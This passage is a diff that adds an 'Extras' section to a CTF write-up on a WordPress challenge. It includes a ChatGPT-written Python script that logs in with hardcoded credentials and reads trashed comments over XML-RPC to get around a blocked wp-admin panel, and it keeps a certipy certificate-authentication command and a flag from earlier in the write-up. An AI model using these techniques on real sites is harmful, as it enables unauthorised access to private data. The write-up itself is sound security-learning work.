@@ -236,3 +236,56 @@ proxychains -q certipy auth -pfx administrator_dc.pfx -dc-ip 94.72.112.254
 
 Flag: `r00t{C3rtificate_f0r_grandline_wh4t_a_j0ke_I_can_for9e}`
 
+## Extras
+After finishing the CTF, I got this idea. Since I was playing around with xmlrpc, could we have just accessed the comment in trash using xmlrpc? Then we don't need to struggle with the 403 bypass. Even though xmlrpc functionality is limited. It can pretty much read most of the things on wordpress.
+
+ChatGPT for the win. ChatGPT wrote for me this python script that I could use to read the hidden comment and flag. Awesome!
+
+```py
+import xmlrpc.client
+
+# WordPress site XML-RPC URL
+wp_url = "http://154.12.228.253/xmlrpc.php"
+
+# WordPress login credentials
+wp_username = "crocodile"
+wp_password = "Winterseason1234"
+
+# Create the XML-RPC client
+client = xmlrpc.client.ServerProxy(wp_url)
+
+# Define the parameters to get comments in the trash
+comment_filter = {
+    'status': 'trash',  # Filter comments with status 'trash'
+}
+
+# Call the wp.getComments method
+try:
+    comments = client.wp.getComments(0, wp_username, wp_password, comment_filter)
+
+    # Check if any comments are found
+    if comments:
+        print("Comments in Trash:")
+        for comment in comments:
+            print(f"ID: {comment['comment_id']}")
+            print(f"Post ID: {comment['post_id']}")
+            print(f"Author: {comment['author']}")
+            print(f"Content: {comment['content']}")
+            print(f"Date: {comment['date_created_gmt']}")
+            print("-" * 40)
+    else:
+        print("No comments found in the trash.")
+except xmlrpc.client.Fault as e:
+    print(f"Error occurred: {e}")
+```
+
+{{< image src="/img/p3rf3ctr00t_ctf_2024/wordstress_30.png" alt="" position="center" style="border-radius: 8px;" >}}
+
+I'm not sure the author knew this was possible. This is a clear indication that blocking access to the wp-admin portal doesn't really fully protect the wordpress instance, xmlrpc has some useful functionality! This is if you have valid credentials. Most online resources around attacking wordpress using xmlrpc don't really cover this. 
+
+There is potential to write an enum script that goes through xmlrpc if wp-admin is blocked. I hope you the reader can look into it. I surely will.
+
+It tried using wp-json but I didn't succeed.
+
+## Conclusion
+This was good challenge, cheers to the author [Winter](https://x.com/byronchris25). Thanks for reading to the end!
